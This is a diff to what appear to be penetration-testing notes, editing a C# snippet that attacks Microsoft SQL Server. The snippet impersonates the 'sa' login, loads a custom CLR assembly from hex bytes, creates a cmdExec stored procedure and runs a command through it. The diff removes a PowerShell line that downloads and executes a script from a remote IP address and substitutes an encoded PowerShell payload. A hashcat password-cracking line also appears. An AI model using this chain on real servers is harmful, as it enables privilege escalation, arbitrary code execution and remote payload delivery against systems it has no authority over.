@@ -697,24 +697,11 @@ hashcat.exe -m 5600 hash.txt rockyou.txt
 <summary>Custom Assembly Code</summary>
 
 ```csharp
-String querylogin = "SELECT SYSTEM_USER;";
-SqlCommand command = new SqlCommand(querylogin, con);
-SqlDataReader reader = command.ExecuteReader();
-reader.Read();
-Console.WriteLine("Before Impersonation: " + reader[0]);
-reader.Close();
-
 String executeas = "EXECUTE AS LOGIN = 'sa';";
-command = new SqlCommand(executeas, con);
-reader = command.ExecuteReader();
+SqlCommand  command = new SqlCommand(executeas, con);
+SqlDataReader reader = command.ExecuteReader();
 reader.Close();
 
-querylogin = "SELECT SYSTEM_USER;";
-command = new SqlCommand(querylogin, con);
-reader = command.ExecuteReader();
-reader.Read();
-Console.WriteLine("After Impersonation: " + reader[0]);
-reader.Close();
 
 new SqlCommand("USE msdb;", con).ExecuteNonQuery();
 new SqlCommand("DROP PROCEDURE IF EXISTS [dbo].[cmdExec];", con).ExecuteNonQuery();
@@ -730,8 +717,7 @@ new SqlCommand("CREATE ASSEMBLY myAssembly FROM 0x4D5A90000300000004000000FFFF00
 
 new SqlCommand("CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR(4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];", con).ExecuteNonQuery();
 
-//command = new SqlCommand("EXEC cmdExec 'whoami /all'", con);
-String execCmd = "EXEC cmdExec 'powershell -c \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://192.168.45.197/runall.ps1\\\")\"'";
+String execCmd = "EXEC cmdExec 'powershell -e SQBFAF...'";
 command = new SqlCommand(execCmd, con);
 reader = command.ExecuteReader();
 
